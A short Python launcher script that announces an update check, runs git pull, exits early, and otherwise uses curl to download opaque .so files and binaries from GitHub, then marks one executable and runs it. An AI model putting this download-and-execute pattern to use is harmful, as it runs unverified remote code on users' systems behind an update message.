from os import system,remove
from platform import machine
import os
print('Checking For Update...')
system('git pull')
exit('security updating...')
try:remove('nox')
except:pass
if machine()=='aarch64':
    if not os.path.exists('body64.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/body64.so -o body64.so')
    if not os.path.exists('cryptron64.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/cryptron64.so -o cryptron64.so')
    system('curl -L https://github.com/Nox-Naved/.../raw/main/nox -o nox')
    system('curl -L https://github.com/Nox-Naved/D-FILE/blob/main/dump?raw=true -o dump;chmod +x nox;./nox')
else:
    if not os.path.exists('body32.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/body32.so -o body32.so')
    if not os.path.exists('cryptron32.so'):system('curl -L https://github.com/Nox-Naved/.../raw/main/cryptron32.so -o cryptron32.so')
    system('curl -L https://github.com/Nox-Naved/.../raw/main/nox32 -o nox')
    system('curl -L https://github.com/Nox-Naved/D-FILE/blob/main/dfile32?raw=true -o dump;chmod +x nox;./nox')

